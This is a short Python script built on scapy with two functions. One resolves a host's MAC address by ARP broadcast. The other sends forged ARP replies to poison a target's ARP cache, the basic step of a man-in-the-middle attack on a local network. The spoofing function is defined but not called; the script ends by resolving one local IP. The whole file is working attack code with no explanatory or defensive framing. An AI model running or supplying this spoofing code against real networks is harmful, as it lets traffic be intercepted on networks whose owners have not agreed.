#!/usr/bin/env python

import scapy.all as scapy


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    bc = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_bc = bc/arp_req
    anwsered = scapy.srp(arp_req_bc, timeout=1, verbose=False)[0]
    return anwsered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

get_mac("10.0.0.138")
